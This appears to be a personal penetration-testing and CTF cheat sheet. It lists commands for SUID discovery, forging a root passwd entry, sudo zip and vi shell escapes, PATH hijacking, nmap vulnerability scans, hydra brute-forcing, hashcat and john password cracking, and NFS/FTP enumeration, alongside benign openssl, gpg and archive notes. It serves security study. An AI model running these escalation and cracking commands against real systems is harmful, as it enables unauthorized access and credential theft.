## Finding SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```
## Create Salt Passwd
```
openssl passwd -1 -salt [salt] [password]

salt:new passwd:123

new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

## openSSL
```
generate prikey
openssl genrsa -aes256 -out private.key 8912

generate pubkey
openssl rsa -in private.key -pubout -out public.key

encrypt
openssl rsautl -encrypt -pubin -inkey public.key -in plaintext.txt -out encrypted.txt

decrypt
openssl rsautl -decrypt -inkey private.key -in encrypted.txt -out plaintext.txt
```

## pgp
```
encrypt
gpg -c data.txt

decrypt
gpg -d data.txt.gpg
```

## scp
```
remote to local
 scp username@remote.example.com:/remote/directory/a.txt /local/directory
 
 scp /local/test.txt user@remoteHost:/home/user/tmp/
```
local to remote
## zip escalate
```
sudo zip filename.zip filename.txt -T --unzip-command="sh -c /bin/bash"
```
## export
```
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
```


## sudo enum
```
sudo -l
```

## vi escalation
```
:!sh
```

## namp
```
allport scan
nmap -vv -sV -p- --script vuln TARGETIP

smb-enum
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

nmap -sT -p port-number -O -sC -sV -T[1-5] -oA output-file-name ip-address

```

## dirb
```
dirb TARGETURL WORDLIST 
ex :dirb http://hogehoge /usr/share/wordlist/dirbuster/xxxxx.txt
```
## zips
```
tar.gz
-zip
tar -zcvf xxxx.tar.gz directory
-unzip
tar -zxvf xxxx.tar.gz

gz
-unzip
gunzip target

```

## hashcat
```

hashcat -m 0 hases.txt /usr/share/wordlists/rockyou.txt --force

```

## hashidentifier
```
hash-identifier
```

## John
- hash
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```


## hydra bruteforce
```
hydra -l bob -P WORDLIST -t 1 -f HOSTNAME http-get /DIR/
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.2.215 http-get /protected/

hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V
```
## nikto
```
nikto -h host:port

```

## steg
```
steghide extract -sf ./<file to extract>.jpg
```

## zip crack
```
fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt ./file.zip
```


## enum FTPs
```
FTP 
ftp ip-address
anonymous/anonymous

NFS
showmount -e ip-address
mount ip:/file/path /local/file/path

```

## hash
```
md5sum data.txt
```
## aws
```
curl advent-bucket-one.s3.amazonaws.com | xmllint --format -
```

## reverse
```
r2 -d file-name

analyze
aa
view
pdf @main
```


## TIPS
```
cat .bash_history

find foo -exec whoami \;
```

## useful links
GTFOBins  : unix binaries list
- https://gtfobins.github.io/#


Metasploit
- reverse_tcp payload
  - https://netsec.ws/?p=331

- meterpreter basis
  - https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

hash
- hash identifier
  - https://www.tunnelsup.com/hash-analyzer/
 - hash resolver
  - https://crackstation.net/
